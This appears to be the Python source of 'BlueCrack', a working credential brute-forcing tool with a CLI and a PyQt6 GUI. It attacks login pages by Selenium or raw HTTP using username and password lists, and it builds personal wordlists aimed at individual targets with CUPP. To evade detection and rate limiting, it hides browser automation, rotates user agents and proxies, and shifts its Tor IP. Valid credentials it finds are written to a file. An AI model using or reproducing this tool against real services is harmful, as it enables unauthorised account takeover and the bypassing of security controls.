print("""
\033[34m██████╗ ██╗     ██╗   ██╗███████╗\033[0m \033[31m ██████╗██████╗  █████╗  ██████╗██╗  ██╗\033[0m
\033[34m██╔══██╗██║     ██║   ██║██╔════╝\033[0m \033[31m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\033[0m
\033[34m██████╔╝██║     ██║   ██║█████╗  \033[0m \033[31m██║     ██████╔╝███████║██║     █████╔╝ \033[0m
\033[34m██╔══██╗██║     ██║   ██║██╔══╝  \033[0m \033[31m██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \033[0m
\033[34m██████╔╝███████╗╚██████╔╝███████╗\033[0m \033[31m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[0m
\033[34m╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝\033[0m \033[31m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[0m
""")

import argparse
import threading
import time
import random
import os
import sys
import signal
import requests
from queue import Queue

from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import keyboard

# Optional: PyQt6 GUI
try:
    from PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout,
                                 QLabel, QLineEdit, QPushButton, QCheckBox,
                                 QSpinBox, QTextEdit, QFileDialog, QMessageBox,
                                 QTabWidget, QFormLayout, QGroupBox, QDoubleSpinBox,
                                 QFrame, QSplitter, QProgressBar, QComboBox,
                                 QScrollArea, QSizePolicy)
    from PyQt6.QtCore import QThread, pyqtSignal, Qt, QTimer
    from PyQt6.QtGui import QFont, QColor, QShortcut, QKeySequence, QIcon
    HAS_PYQT = True
except ImportError:
    HAS_PYQT = False

# Optional: Tor IP shifting via stem
try:
    from stem import Signal as TorSignal
    from stem.control import Controller as TorController
    HAS_STEM = True
except ImportError:
    HAS_STEM = False

# ── Graceful stop flag (shared between CLI & GUI) ──
_GLOBAL_STOP = threading.Event()

def _signal_handler(sig, frame):
    print("\n[!] Caught Ctrl+C / Ctrl+X — stopping gracefully...")
    _GLOBAL_STOP.set()

signal.signal(signal.SIGINT, _signal_handler)


def change_tor_ip(control_port=9051, password=None):
    """Request a new Tor identity (new IP)."""
    if not HAS_STEM:
        return False
    try:
        with TorController.from_port(port=control_port) as ctrl:
            if password:
                ctrl.authenticate(password=password)
            else:
                ctrl.authenticate()
            ctrl.signal(TorSignal.NEWNYM)
            return True
    except Exception as e:
        print(f"[-] Tor IP shift failed: {e}")
        return False

def get_optimized_chrome_options():
    """Generates MAXIMUM performance Chrome options for extremely low-end specs (e.g. Pentium B950, 6GB RAM)."""
    options = webdriver.ChromeOptions()
    options.page_load_strategy = 'none'  # 'none' allows script to continue without waiting for full page load
    options.add_argument('--blink-settings=imagesEnabled=false') # Block images
    options.add_argument('--disable-extensions')
    options.add_argument('--disable-infobars')
    options.add_argument('--disable-notifications')
    options.add_argument('--disable-popup-blocking')
    options.add_argument('--disable-crash-reporter')
    options.add_argument('--disable-logging')
    options.add_argument('--log-level=3')
    options.add_argument('--disable-gpu') # Force disable GPU
    options.add_argument('--disable-software-rasterizer')
    options.add_argument('--disable-features=NetworkService,VizDisplayCompositor')
    options.add_argument('--disable-background-timer-throttling')
    options.add_argument('--disable-backgrounding-occluded-windows')
    options.add_argument('--disable-breakpad')
    options.add_argument('--disable-component-extensions-with-background-pages')
    options.add_argument('--disable-features=TranslateUI,BlinkGenPropertyTrees')
    options.add_argument('--disable-ipc-flooding-protection')
    options.add_argument('--disable-renderer-backgrounding')
    options.add_argument('--enable-features=NetworkServiceInProcess')
    options.add_argument('--metrics-recording-only')
    options.add_argument('--mute-audio')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    
    # STEALTH
    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument('--disable-blink-features=AutomationControlled')
    return options

# CLI ARGUMENTS (HYDRA STYLE)
parser = argparse.ArgumentParser(description="Hydra-style Browser Tester")

# USERNAME INPUT
parser.add_argument("-u", "--user", dest="username",
                    help="single username to test")
parser.add_argument("-U", "--userfile", dest="userfile",
                    help="file containing list of usernames")

# PASSWORD INPUT
parser.add_argument("-p", "--passw", dest="password",
                    help="single password to test")
parser.add_argument("-P", "--passlist", dest="passfile",
                    help="file containing list of passwords")

# OTHER
parser.add_argument("--threads", type=int, default=1,
                    help="number of threads")
parser.add_argument("--url",
                    help="login page URL")
parser.add_argument("--error", default="incorrect",
                    help="error message to check for failed login (default: 'incorrect')")
parser.add_argument("--headless", action="store_true",
                    help="run worker browsers in headless mode")
parser.add_argument("--delay", type=float, default=0.0,
                    help="delay between natural attempts to stay stealthy")
parser.add_argument("--limit-text", default="too many requests",
                    help="text confirming rate limit hit")
parser.add_argument("--cooldown", type=int, default=12,
                    help="cooldown bypass timer to wait out rate blocks")
parser.add_argument("--jitter", type=float, default=0.0,
                    help="randomize the delay by up to X seconds to avoid pattern detection")
parser.add_argument("--proxy", 
                    help="single proxy to use (e.g., http://12.34.56.78:8080)")
parser.add_argument("--proxy-list", dest="proxyfile",
                    help="file containing list of proxies to rotate")
parser.add_argument("-i", "--interactive", action="store_true",
                    help="launch fully interactive/auto setup wizard")
parser.add_argument("--gui", action="store_true",
                    help="launch the PyQt6 GUI instead of CLI")

# RAW HTTP MODE FEATURES
parser.add_argument("--raw", action="store_true",
                    help="use raw requests mode (MUCH faster, bypasses Selenium. Ideal for low-end PCs)")
parser.add_argument("--method", default="POST",
                    help="HTTP method for --raw mode (e.g., POST, GET). Default: POST")
parser.add_argument("--data", default="username=^USER^&password=^PASS^",
                    help="Data string for --raw mode. Use ^USER^ and ^PASS^ as placeholders")
parser.add_argument("--headers",
                    help="Custom headers for --raw mode. Format: 'Header1: Value1|Header2: Value2'")
parser.add_argument("--success",
                    help="Optional explicit success message to look for to verify login (for --raw or Selenium)")
parser.add_argument("--timeout", type=int, default=10,
                    help="Timeout in seconds for --raw mode requests")

args = parser.parse_args()

# ═══════════════════════════════════════════════════════════════════
# ██  GUI MODE  ██
# ═══════════════════════════════════════════════════════════════════
if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
    if not HAS_PYQT:
        raise SystemExit("PyQt6 not installed. Run: pip install PyQt6 stem")
    # ── Import CUPP helpers ──
    _cupp_dir = os.path.dirname(os.path.abspath(__file__))
    sys.path.insert(0, _cupp_dir)
    try:
        import cupp as _cupp_mod
    except ImportError:
        _cupp_mod = None

    # ─────────────────── Enterprise / Production Stylesheet ───────────────────
    DARK_STYLE = """
    QWidget {
        background-color: #0E1116;
        color: #D1D5DB;
        font-family: 'Inter', '-apple-system', 'Segoe UI', sans-serif;
    }
    QGroupBox {
        border: 1px solid #1F2937;
        border-radius: 6px;
        margin-top: 16px;
        padding: 20px 12px 12px 12px;
        font-weight: 600;
        color: #F3F4F6;
        background-color: #111827;
    }
    QGroupBox::title {
        subcontrol-origin: margin;
        subcontrol-position: top left;
        left: 12px;
        top: 2px;
        padding: 2px 8px;
        background-color: #1F2937;
        color: #9CA3AF;
        border-radius: 4px;
        font-size: 11px;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }
    QScrollArea {
        border: none;
        background: transparent;
    }
    QScrollArea > QWidget > QWidget {
        background: transparent;
    }
    QTabWidget::pane {
        border: 1px solid #1F2937;
        border-radius: 6px;
        background: #0E1116;
    }
    QTabBar::tab {
        background: #111827;
        color: #6B7280;
        border: 1px solid transparent;
        padding: 8px 20px;
        border-radius: 4px;
        margin-right: 4px;
        font-weight: 500;
        font-size: 12px;
        margin-bottom: 2px;
    }
    QTabBar::tab:selected {
        background: #1F2937;
        color: #F9FAFB;
        border: 1px solid #374151;
        border-bottom: 2px solid #3B82F6;
    }
    QTabBar::tab:hover:!selected {
        background: #171E2B;
        color: #D1D5DB;
    }
    QLineEdit, QSpinBox, QDoubleSpinBox, QComboBox {
        background-color: #030712;
        border: 1px solid #374151;
        border-radius: 4px;
        padding: 6px 10px;
        color: #F9FAFB;
        font-size: 12px;
        selection-background-color: #3B82F6;
        min-height: 18px;
    }
    QLineEdit:focus, QSpinBox:focus, QDoubleSpinBox:focus, QComboBox:focus {
        border: 1px solid #3B82F6;
        background-color: #0F172A;
    }
    QPushButton {
        background-color: #1F2937;
        border: 1px solid #374151;
        border-radius: 4px;
        padding: 8px 16px;
        color: #F3F4F6;
        font-weight: 500;
        font-size: 12px;
    }
    QPushButton:hover {
        background-color: #374151;
        border: 1px solid #4B5563;
    }
    QPushButton:pressed {
        background-color: #111827;
    }
    QPushButton:disabled {
        background-color: #111827;
        color: #4B5563;
        border: 1px solid #1F2937;
    }
    QCheckBox {
        spacing: 8px;
        color: #9CA3AF;
        font-weight: 400;
        font-size: 12px;
    }
    QCheckBox::indicator {
        width: 14px; height: 14px;
        border-radius: 3px;
        border: 1px solid #4B5563;
        background: #030712;
    }
    QCheckBox::indicator:checked {
        background-color: #3B82F6;
        border-color: #3B82F6;
    }
    QTextEdit {
        background-color: #030712;
        border: 1px solid #1F2937;
        border-radius: 4px;
        color: #E5E7EB;
        font-family: 'JetBrains Mono', 'Cascadia Code', 'Fira Code', monospace;
        font-size: 12px;
        padding: 10px;
    }
    QProgressBar {
        background-color: #111827;
        border: 1px solid #1F2937;
        border-radius: 4px;
        text-align: center;
        color: #F9FAFB;
        font-weight: 500;
        font-size: 11px;
        height: 18px;
    }
    QProgressBar::chunk {
        background-color: #3B82F6;
        border-radius: 3px;
    }
    QLabel#titleLabel {
        font-size: 20px;
        font-weight: 700;
        color: #F9FAFB;
        letter-spacing: 0.5px;
    }
    QLabel#subtitleLabel {
        font-size: 12px;
        color: #6B7280;
        font-weight: 400;
    }
    """

    # ─────────────────── GUI Worker Thread ───────────────────
    class GuiWorkerThread(QThread):
        log_signal = pyqtSignal(str)
        progress_signal = pyqtSignal(int, int)  # current, total
        finished_signal = pyqtSignal(bool, str)  # found, message

        def __init__(self, ctx):
            super().__init__()
            self.ctx = ctx
            self._stop_flag = threading.Event()

        def request_stop(self):
            self._stop_flag.set()
            _GLOBAL_STOP.set()

        def log(self, msg):
            self.log_signal.emit(msg)

        def run(self):
            _GLOBAL_STOP.clear()
            ctx = self.ctx
            users = ctx['users']
            passwords = ctx['passwords']
            total = len(users) * len(passwords)
            done = [0]
            found_users = set()
            multiple_users = len(users) > 1

            q = Queue()
            for u in users:
                for p in passwords:
                    q.put((u, p))

            if not ctx.get('raw_mode'):
                # Setup driver for selector detection
                self.log("[*] Opening browser for selector setup...")
                setup_driver = webdriver.Chrome()
                try:
                    setup_driver.get(ctx['target_url'])
                    time.sleep(2)
                    # Auto-detect
                    setup_driver.execute_script("""
                        document.addEventListener('click', function(e){ window._lastClicked = e.target; });
                    """)
                    setup_driver.execute_script("""
                        window._autoFindFields = function() {
                            let passwordField = document.querySelector('input[type="password"]');
                            let userField = null;
                            if (passwordField) {
                                let inputs = Array.from(passwordField.form ? passwordField.form.querySelectorAll('input') : document.querySelectorAll('input'));
                                for (let el of inputs) {
                                    if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
                                        userField = el; break;
                                    }
                                }
                            }
                            let ucss = userField ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : '')) : null;
                            let pcss = passwordField ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : '')) : null;
                            return [ucss, pcss];
                        };
                    """)
                    detected = setup_driver.execute_script("return window._autoFindFields();")
                    if detected and detected[0] and detected[1]:
                        ctx['username_selector'], ctx['password_selector'] = detected
                        self.log(f"[+] Auto-detected  User: {detected[0]}")
                        self.log(f"[+] Auto-detected  Pass: {detected[1]}")
                    else:
                        self.log("[-] Auto-detect failed. Using keyboard fallback...")
                        self.log("    Click username field → press S")
                        self.log("    Click password field → press T")
                        while not (ctx.get('username_selector') and ctx.get('password_selector')):
                            if self._stop_flag.is_set():
                                setup_driver.quit()
                                self.finished_signal.emit(False, "Stopped by user.")
                                return
                            if keyboard.is_pressed('s'):
                                elem = setup_driver.execute_script("return window._lastClicked")
                                if elem:
                                    css = setup_driver.execute_script("""
                                    function cssPath(el){ if(!el)return null;var p=[];while(el.nodeType===1){var s=el.nodeName.toLowerCase();if(el.id){s+='#'+el.id;p.unshift(s);break}else{var sib=el,n=1;while(sib=sib.previousElementSibling){if(sib.nodeName.toLowerCase()==s)n++}if(n!=1)s+=':nth-of-type('+n+')'}p.unshift(s);el=el.parentNode}return p.join(' > ')}
                                    return cssPath(arguments[0]);
                                    """, elem)
                                    if css:
                                        ctx['username_selector'] = css
                                        self.log(f"[+] Username LOCKED: {css}")
                                time.sleep(0.3)
                            if keyboard.is_pressed('t'):
                                elem = setup_driver.execute_script("return window._lastClicked")
                                if elem:
                                    css = setup_driver.execute_script("""
                                    function cssPath(el){ if(!el)return null;var p=[];while(el.nodeType===1){var s=el.nodeName.toLowerCase();if(el.id){s+='#'+el.id;p.unshift(s);break}else{var sib=el,n=1;while(sib=sib.previousElementSibling){if(sib.nodeName.toLowerCase()==s)n++}if(n!=1)s+=':nth-of-type('+n+')'}p.unshift(s);el=el.parentNode}return p.join(' > ')}
                                    return cssPath(arguments[0]);
                                    """, elem)
                                    if css:
                                        ctx['password_selector'] = css
                                        self.log(f"[+] Password LOCKED: {css}")
                                time.sleep(0.3)
                            time.sleep(0.1)
                except Exception as e:
                    self.log(f"[-] Setup error: {e}")
                    try: setup_driver.quit()
                    except: pass
                    self.finished_signal.emit(False, str(e))
                    return
                try: setup_driver.quit()
                except: pass

            self.log(f"[*] Launching {ctx['threads']} worker thread(s)...")

            def _run_worker():
                wd = None
                session = None
                
                if ctx.get('raw_mode'):
                    session = requests.Session()
                    if ctx.get('proxies'):
                        proxy = random.choice(ctx['proxies'])
                        session.proxies = {"http": proxy, "https": proxy}
                    
                    # Parse custom headers
                    raw_headers_str = ctx.get('raw_headers', "")
                    headers = {}
                    if raw_headers_str:
                        try:
                            for pair in raw_headers_str.split('|'):
                                if ':' in pair:
                                    k, v = pair.split(':', 1)
                                    headers[k.strip()] = v.strip()
                        except Exception as e:
                            self.log(f"[-] Failed to parse headers: {e}")
                    session.headers.update(headers)
                else:
                    options = get_optimized_chrome_options()
                    
                    # Dynamic options
                    UA = [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
                    ]
                    options.add_argument(f"user-agent={random.choice(UA)}")
                    if ctx.get('use_tor'):
                        options.add_argument("--proxy-server=socks5://127.0.0.1:9050")
                    elif ctx.get('proxies'):
                        options.add_argument(f"--proxy-server={random.choice(ctx['proxies'])}")
                    if ctx.get('headless'):
                        options.add_argument("--headless=new")
                    
                    try: wd = webdriver.Chrome(options=options)
                    except Exception as e:
                        self.log(f"[-] Thread startup error: {e}")
                        return

                tor_counter = 0
                try:
                    while not q.empty() and not self._stop_flag.is_set() and not _GLOBAL_STOP.is_set():
                        if not multiple_users and found_users:
                            break
                            
                        user, pwd = q.get()
                        if not pwd or not pwd.strip():
                            q.task_done(); continue
                            
                        if user in found_users:
                            done[0] += 1
                            self.progress_signal.emit(done[0], total)
                            q.task_done()
                            continue
                            
                        tor_counter += 1
                        if ctx.get('use_tor') and ctx.get('tor_shift_every', 0) > 0 and tor_counter % ctx['tor_shift_every'] == 0:
                            self.log("[~] Shifting Tor IP...")
                            change_tor_ip(ctx.get('tor_port', 9051))
                            time.sleep(2)
                        
                        try:
                            delay = ctx.get('delay', 0)
                            jitter = ctx.get('jitter', 0)
                            if jitter > 0: delay += random.uniform(0, jitter)
                            if delay > 0: 
                                for _ in range(int(delay * 10)):
                                    if self._stop_flag.is_set() or _GLOBAL_STOP.is_set(): break
                                    time.sleep(0.1)
                                    
                            self.log(f"[*] Trying: {user} / {pwd}")
                            
                            src = ""
                            if ctx.get('raw_mode'):
                                raw_method = ctx.get('raw_method', 'POST')
                                raw_data = ctx.get('raw_data', "")
                                raw_timeout = ctx.get('raw_timeout', 10)
                                payload = raw_data.replace("^USER^", user).replace("^PASS^", pwd)
                                
                                try:
                                    if raw_method == "POST":
                                        is_json = session.headers.get("Content-Type") == "application/json"
                                        if is_json:
                                            resp = session.post(ctx['target_url'], data=payload.encode('utf-8'), timeout=raw_timeout)
                                        else:
                                            hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
                                            resp = session.post(ctx['target_url'], data=payload, headers=hdrs, timeout=raw_timeout)
                                    else:
                                        resp = session.get(ctx['target_url'] + "?" + payload, timeout=raw_timeout)
                                    src = resp.text.lower()
                                except requests.exceptions.RequestException as e:
                                    self.log(f"[-] Request error ({user}): {e}")
                                    q.task_done()
                                    continue
                            else:
                                wd.get(ctx['target_url'])
                                wait = WebDriverWait(wd, 5)
                                u_el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ctx['username_selector'])))
                                p_el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ctx['password_selector'])))
                                
                                u_el.clear()
                                u_el.send_keys(user)
                                p_el.clear()
                                p_el.send_keys(pwd)
                                p_el.send_keys(Keys.ENTER)
                                
                                time.sleep(1)
                                try: src = wd.page_source.lower()
                                except: pass
                            
                            if ctx.get('limit_text') and ctx['limit_text'] in src:
                                self.log("[!] Rate limit hit!")
                                if ctx.get('use_tor'):
                                    change_tor_ip(ctx.get('tor_port', 9051)); time.sleep(3)
                                elif ctx.get('cooldown', 0) > 0:
                                    time.sleep(ctx['cooldown'])
                                q.put((user, pwd))
                                q.task_done()
                                continue
                                
                            is_valid = False
                            success_msg = ctx.get('success_msg')
                            error_msg = ctx.get('error_msg')
                            if success_msg:
                                if success_msg in src:
                                    is_valid = True
                            else:
                                if error_msg and error_msg not in src:
                                    is_valid = True
                                    
                            if not is_valid:
                                # It explicitly failed
                                done[0] += 1
                                self.progress_signal.emit(done[0], total)
                                q.task_done()
                                continue

                            found_users.add(user)
                            self.log(f"\n[+] VALID CREDENTIALS: {user} / {pwd}")
                            try:
                                with open("credentials.txt", "a", encoding="utf-8") as cf:
                                    cf.write(f"{user}:{pwd}\n")
                            except: pass

                            done[0] += 1
                            self.progress_signal.emit(done[0], total)
                            q.task_done()

                            if not multiple_users:
                                with q.mutex: q.queue.clear()
                                break
                            
                            # Clean state restart (only for webdriver)
                            if not ctx.get('raw_mode'):
                                try: wd.quit()
                                except: pass
                                try: wd = webdriver.Chrome(options=options)
                                except: pass

                        except (NoSuchElementException, TimeoutException):
                            self.log(f"[-] Missing elements for {user}, retrying...")
                            q.put((user, pwd))
                            q.task_done()
                            if not ctx.get('raw_mode'):
                                try: wd.quit()
                                except: pass
                                try: wd = webdriver.Chrome(options=options)
                                except: pass
                        except Exception as e:
                            # Catch disconnects and other errors securely
                            q.put((user, pwd))
                            q.task_done()
                            msg = str(e).lower()
                            if "invalid session id" in msg or "detached" in msg or "out of memory" in msg or "no such window" in msg:
                                pass
                            else:
                                self.log(f"[-] Error trying {user}: {e}")
                            if not ctx.get('raw_mode'):
                                try: wd.quit()
                                except: pass
                                try: wd = webdriver.Chrome(options=options)
                                except: pass
                finally:
                    if not ctx.get('raw_mode'):
                        try: wd.quit()
                        except: pass

            threads = []
            for _ in range(ctx['threads']):
                t = threading.Thread(target=_run_worker, daemon=True)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()

            if found_users:
                saved_msg = f"Valid credentials found for {len(found_users)} user(s)! Saved to credentials.txt"
                self.finished_signal.emit(True, saved_msg)
            elif self._stop_flag.is_set() or _GLOBAL_STOP.is_set():
                self.finished_signal.emit(False, "Stopped by user.")
            else:
                self.finished_signal.emit(False, "No valid credentials found.")

    # ─────────────────── CUPP Worker Thread ───────────────────
    class CuppWorkerThread(QThread):
        log_signal = pyqtSignal(str)
        finished_signal = pyqtSignal(str)  # path to generated file

        def __init__(self, profile):
            super().__init__()
            self.profile = profile

        def run(self):
            try:
                if _cupp_mod is None:
                    self.log_signal.emit("[-] cupp.py not found in directory.")
                    self.finished_signal.emit("")
                    return
                _cupp_mod.read_config(os.path.join(_cupp_dir, "cupp.cfg"))
                self.log_signal.emit("[*] Generating CUPP wordlist...")
                # Build the profile dict that generate_wordlist_from_profile expects
                p = self.profile
                p.setdefault('spechars1', 'n')
                p.setdefault('randnum', 'n')
                p.setdefault('leetmode', 'n')
                
                # Mock builtins.input to prevent CUPP from hanging on "Hyperspeed Print?"
                import builtins
                original_input = builtins.input
                builtins.input = lambda prompt="": "n"
                try:
                    _cupp_mod.generate_wordlist_from_profile(p)
                finally:
                    builtins.input = original_input
                    
                outfile = p['name'] + '.txt'
                if os.path.exists(outfile):
                    with open(outfile) as f:
                        cnt = sum(1 for _ in f)
                    self.log_signal.emit(f"[+] CUPP done! {cnt} passwords → {outfile}")
                    self.finished_signal.emit(os.path.abspath(outfile))
                else:
                    self.log_signal.emit("[-] CUPP generated no output.")
                    self.finished_signal.emit("")
            except Exception as e:
                self.log_signal.emit(f"[-] CUPP error: {e}")
                self.finished_signal.emit("")

    # ─────────────────── Main GUI Window ───────────────────
    class BlueCrackGUI(QWidget):
        def __init__(self):
            super().__init__()
            self.worker_thread = None
            self.setWindowTitle("BlueCrack")
            self.setMinimumSize(820, 700)
            self._build_ui()

        def _build_ui(self):
            root = QVBoxLayout(self)
            root.setContentsMargins(16, 12, 16, 12)
            root.setSpacing(8)

            # ── Title bar ──
            title = QLabel("BLUE CRACK")
            title.setObjectName("titleLabel")
            title.setAlignment(Qt.AlignmentFlag.AlignCenter)
            sub = QLabel("Hydra-style Browser Brute Tester  ·  GUI Mode")
            sub.setObjectName("subtitleLabel")
            sub.setAlignment(Qt.AlignmentFlag.AlignCenter)
            root.addWidget(title)
            root.addWidget(sub)

            # ── Tabs ──
            self.tabs = QTabWidget()
            root.addWidget(self.tabs, stretch=1)

            # ═══ TAB 1 : Target ═══
            tgt_scroll = QScrollArea()
            tgt_scroll.setWidgetResizable(True)
            tgt_scroll.setFrameShape(QFrame.Shape.NoFrame)
            tgt_w = QWidget()
            tgt_l = QVBoxLayout(tgt_w)
            tgt_l.setSpacing(6)

            tgt_grp = QGroupBox("  Target Configuration")
            tgt_grp.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum)
            tgt_f = QFormLayout(tgt_grp)
            tgt_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            tgt_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            tgt_f.setHorizontalSpacing(12)
            tgt_f.setVerticalSpacing(12)
            self.url_in = QLineEdit(); self.url_in.setPlaceholderText("https://target.com/login")
            tgt_f.addRow("URL:", self.url_in)

            user_row = QHBoxLayout()
            self.user_in = QLineEdit(); self.user_in.setPlaceholderText("admin  or  path/to/users.txt")
            user_btn = QPushButton("📂")
            user_btn.setFixedWidth(36)
            user_btn.clicked.connect(lambda: self._pick_file(self.user_in))
            user_row.addWidget(self.user_in); user_row.addWidget(user_btn)
            tgt_f.addRow("Username / File:", user_row)

            pass_row = QHBoxLayout()
            self.pass_in = QLineEdit(); self.pass_in.setPlaceholderText("password  or  path/to/pass.txt")
            pass_btn = QPushButton("📂")
            pass_btn.setFixedWidth(36)
            pass_btn.clicked.connect(lambda: self._pick_file(self.pass_in))
            pass_row.addWidget(self.pass_in); pass_row.addWidget(pass_btn)
            tgt_f.addRow("Password / File:", pass_row)
            tgt_l.addWidget(tgt_grp)
            tgt_l.addStretch()
            tgt_scroll.setWidget(tgt_w)

            self.tabs.addTab(tgt_scroll, "🎯  Target")

            # ═══ TAB 2 : Engine ═══
            eng_scroll = QScrollArea()
            eng_scroll.setWidgetResizable(True)
            eng_scroll.setFrameShape(QFrame.Shape.NoFrame)
            eng_w = QWidget()
            eng_l = QVBoxLayout(eng_w)
            eng_l.setSpacing(6)

            eng_grp = QGroupBox("  Engine Settings")
            eng_grp.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum)
            eng_f = QFormLayout(eng_grp)
            eng_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            eng_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            eng_f.setHorizontalSpacing(12)
            eng_f.setVerticalSpacing(12)
            self.threads_in = QSpinBox(); self.threads_in.setRange(1, 50); self.threads_in.setValue(1)
            self.delay_in = QDoubleSpinBox(); self.delay_in.setRange(0, 120); self.delay_in.setSingleStep(0.5)
            self.jitter_in = QDoubleSpinBox(); self.jitter_in.setRange(0, 30); self.jitter_in.setSingleStep(0.5)
            self.err_in = QLineEdit("incorrect"); self.err_in.setPlaceholderText("error text on failed login")
            self.limit_in = QLineEdit("too many requests")
            self.cooldown_in = QSpinBox(); self.cooldown_in.setRange(0, 300); self.cooldown_in.setValue(12)
            self.headless_cb = QCheckBox("Headless browsers (no visible window)")
            self.headless_cb.setChecked(True)
            
            eng_f.addRow("Threads:", self.threads_in)
            eng_f.addRow("Delay (s):", self.delay_in)
            eng_f.addRow("Jitter (s):", self.jitter_in)
            eng_f.addRow("Error text:", self.err_in)
            
            self.success_in = QLineEdit(""); self.success_in.setPlaceholderText("optional success text (override error text)")
            eng_f.addRow("Success text:", self.success_in)
            
            eng_f.addRow("Rate-limit text:", self.limit_in)
            eng_f.addRow("Cooldown (s):", self.cooldown_in)
            eng_f.addRow("", self.headless_cb)
            eng_l.addWidget(eng_grp)

            # Raw Engine Settings
            raw_grp = QGroupBox("  ⚡ Raw HTTP Mode (Fast / Bypass Selenium)")
            raw_grp.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum)
            raw_f = QFormLayout(raw_grp)
            raw_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            raw_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            raw_f.setHorizontalSpacing(12)
            raw_f.setVerticalSpacing(12)
            
            self.raw_cb = QCheckBox("Enable Raw HTTP Requests")
            self.raw_method_cb = QComboBox()
            self.raw_method_cb.addItems(["POST", "GET"])
            self.raw_data_in = QLineEdit("username=^USER^&password=^PASS^")
            self.raw_headers_in = QLineEdit(""); self.raw_headers_in.setPlaceholderText("Header1: Value1 | Header2: Value2")
            self.raw_timeout_in = QSpinBox(); self.raw_timeout_in.setRange(1, 120); self.raw_timeout_in.setValue(10)
            
            raw_f.addRow("", self.raw_cb)
            raw_f.addRow("Method:", self.raw_method_cb)
            raw_f.addRow("Payload Data:", self.raw_data_in)
            raw_f.addRow("Headers:", self.raw_headers_in)
            raw_f.addRow("Timeout (s):", self.raw_timeout_in)
            
            eng_l.addWidget(raw_grp)
            eng_l.addStretch()
            eng_scroll.setWidget(eng_w)

            self.tabs.addTab(eng_scroll, "⚙  Engine")

            # ═══ TAB 3 : Network / Tor ═══
            net_scroll = QScrollArea()
            net_scroll.setWidgetResizable(True)
            net_scroll.setFrameShape(QFrame.Shape.NoFrame)
            net_w = QWidget()
            net_l = QVBoxLayout(net_w)
            net_l.setSpacing(6)

            net_grp = QGroupBox("  Network / Tor Proxy")
            net_grp.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum)
            net_f = QFormLayout(net_grp)
            net_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            net_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            net_f.setHorizontalSpacing(12)
            net_f.setVerticalSpacing(12)
            self.tor_cb = QCheckBox("Route through Tor  (socks5://127.0.0.1:9050)")
            self.tor_port_in = QSpinBox(); self.tor_port_in.setRange(1024, 65535); self.tor_port_in.setValue(9051)
            self.tor_every_in = QSpinBox(); self.tor_every_in.setRange(0, 9999); self.tor_every_in.setValue(10)
            self.tor_every_in.setToolTip("Shift IP every N attempts. 0 = never")
            self.proxy_in = QLineEdit(); self.proxy_in.setPlaceholderText("http://ip:port  or  path/to/proxies.txt")
            proxy_btn = QPushButton("📂"); proxy_btn.setFixedWidth(36)
            proxy_btn.clicked.connect(lambda: self._pick_file(self.proxy_in))
            proxy_row = QHBoxLayout(); proxy_row.addWidget(self.proxy_in); proxy_row.addWidget(proxy_btn)
            net_f.addRow("", self.tor_cb)
            net_f.addRow("Tor Ctrl Port:", self.tor_port_in)
            net_f.addRow("Shift IP every:", self.tor_every_in)
            net_f.addRow("Proxy / File:", proxy_row)

            net_l.addWidget(net_grp)
            net_l.addStretch()
            net_scroll.setWidget(net_w)

            self.tabs.addTab(net_scroll, "🧅  Network")

            # ═══ TAB 4 : CUPP Wordlist Generator ═══
            cupp_scroll = QScrollArea()
            cupp_scroll.setWidgetResizable(True)
            cupp_scroll.setFrameShape(QFrame.Shape.NoFrame)
            cupp_w = QWidget()
            cupp_l = QVBoxLayout(cupp_w)
            cupp_l.setSpacing(6)
            cupp_grp = QGroupBox("  CUPP — Common User Passwords Profiler")
            cupp_f = QFormLayout(cupp_grp)
            cupp_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            cupp_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
            cupp_f.setHorizontalSpacing(12)
            cupp_f.setVerticalSpacing(8)
